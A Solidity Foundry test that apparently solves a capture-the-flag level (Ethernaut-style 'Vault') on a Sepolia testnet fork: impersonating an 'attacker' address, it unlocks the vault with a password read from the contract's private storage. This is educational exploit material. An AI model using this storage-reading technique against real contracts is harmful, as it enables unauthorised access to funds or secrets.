// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Level8 is Test {
    Vault vault = Vault(payable(0x4be47fE82F3F5041C7E69a2F4002E5bD07Aeb81C));
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"), 4547571);
        vm.startPrank(attacker);
    }

    function testLevel8() public {
        vault.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
    }
}
